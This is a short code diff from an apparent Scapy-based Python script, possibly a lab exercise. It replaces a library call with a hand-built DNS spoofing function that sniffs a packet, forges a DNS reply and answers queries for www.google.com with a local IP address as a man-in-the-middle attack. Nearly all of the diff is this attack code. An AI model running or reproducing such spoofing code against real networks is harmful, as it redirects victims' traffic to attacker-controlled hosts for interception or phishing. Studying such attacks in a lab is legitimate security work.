@@ -14,8 +14,19 @@ def sniff_test() :
     # pkt.show()
     # send(pkt)
     
-def MIMspoofDNS() : 
-    dns_spoof(joker='192.168.178.23', match='www.google.com', from_ip='192.168.178.22')
+def sniffPKT() :
+    pkt = sniff()
+    return pkt
+    
+def MIMspoofDNS(pkt) :
+    EvilDNSResponse = IP() / UDP() / DNS()
+    EvilDNSResponse[IP].dst = pkt[IP].src
+    EvilDNSResponse[UDP].dport = pkt[UDP].dport
+    EvilDNSResponse[DNS].rd = pkt[DNS].rd
+    EvilDNSResponse[DNS].qd = pkt[DNS].qd
+    EvilDNSResponse[DNS].qr = 1
+    EvilDNSResponse[DNS].an = DNSRR(rrname = 'www.google.com', rdata='192.168.178.23')
+    sendp(EvilDNSResponse)
     
 def main() :
     dns_req_test()
